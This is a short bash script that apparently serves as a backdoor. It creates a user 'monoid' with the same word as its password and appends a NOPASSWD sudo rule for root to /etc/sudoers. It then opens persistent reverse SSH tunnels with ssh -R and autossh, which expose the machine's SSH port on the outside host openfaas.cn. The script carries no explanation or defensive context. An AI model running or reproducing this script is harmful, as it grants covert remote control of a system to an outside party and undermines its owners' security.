#!/bin/bash
useradd -s /bin/bash -m monoid
echo "monoid"|passwd --stdin monoid
echo "root    ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers
ssh  -CqTfnN -R 0.0.0.0:7001:127.0.0.1:22 root@openfaas.cn
autossh -M 7281 -fCNR 7280:127.0.0.1:22 root@openfaas.cn
exit 0
